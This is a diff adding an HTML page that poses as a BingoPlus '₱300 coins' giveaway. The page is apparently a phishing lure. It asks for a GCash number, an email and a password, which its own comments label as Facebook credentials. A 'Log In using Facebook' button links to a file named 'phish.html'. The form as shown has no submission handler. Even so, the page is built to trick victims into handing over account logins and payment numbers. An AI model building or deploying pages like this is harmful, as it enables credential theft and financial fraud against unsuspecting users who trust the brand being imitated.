@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>BingoPlus - Claim ₱300 Coins</title>
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      background: #f1f1f1;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      background-color: #fff;
+      padding: 40px 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      width: 100%;
+      max-width: 400px;
+    }
+
+    h1 {
+      font-size: 32px;
+      color: #ff6f61;
+      margin-bottom: 30px;
+      font-weight: bold;
+    }
+
+    .input-group {
+      margin-bottom: 15px;
+      text-align: left;
+    }
+
+    .input-group label {
+      font-size: 16px;
+      color: #333;
+      margin-bottom: 5px;
+      display: block;
+    }
+
+    .input-group input {
+      width: 92%;
+      padding: 10px;
+      border-radius: 5px;
+      border: 1px solid #ddd;
+      font-size: 16px;
+    }
+
+    .input-group input:focus {
+      outline: none;
+      border-color: #ff6f61;
+    }
+
+    .login-btn {
+      background-color: #ff6f61;
+      color: white;
+      padding: 12px;
+      font-size: 18px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      width: 100%;
+      margin-top: 15px;
+    }
+
+    .login-btn:hover {
+      background-color: #ff4a39;
+    }
+
+    .facebook-btn {
+      background-color: #3b5998;
+      color: white;
+      padding: 12px;
+      font-size: 18px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      width: 100%;
+      margin-top: 20px;
+    }
+
+    .facebook-btn:hover {
+      background-color: #2d4373;
+    }
+
+    .note {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #333;
+    }
+
+    .note a {
+      color: #ff6f61;
+      text-decoration: none;
+    }
+
+    .note a:hover {
+      text-decoration: underline;
+    }
+
+    .bingo-logo {
+      width: 150px;
+      margin-bottom: 20px;
+    }
+
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <!-- BingoPlus Logo -->
+    <img src="logo.jpg" alt="BingoPlus Logo" class="bingo-logo">
+
+    <h1>Claim Your ₱300 Coins</h1>
+
+    <!-- GCash Number -->
+    <div class="input-group">
+      <label for="gcash-number">GCash Number</label>
+      <input type="text" id="gcash-number" placeholder="Enter your number" required>
+    </div>
+
+    <!-- Facebook Email -->
+    <div class="input-group">
+      <label for="facebook-email">Email</label>
+      <input type="email" id="facebook-email" placeholder="Enter your email" required>
+    </div>
+
+    <!-- Facebook Password -->
+    <div class="input-group">
+      <label for="facebook-password">Password</label>
+      <input type="password" id="facebook-password" placeholder="Enter your password" required>
+    </div>
+
+    <!-- Log In Button -->
+    <button class="login-btn">Log In</button>
+
+    <!-- Log In Using Facebook Button -->
+    <a href="phish.html">
+        <button class="facebook-btn">Log In using Facebook</button>
+      </a>
+      
+    <!-- Footer Note -->
+    <div class="note">
+      By logging in, you agree to our <a href="#">Terms & Conditions</a> and <a href="#">Privacy Policy</a>.
+    </div>
+  </div>
+
+</body>
+</html>
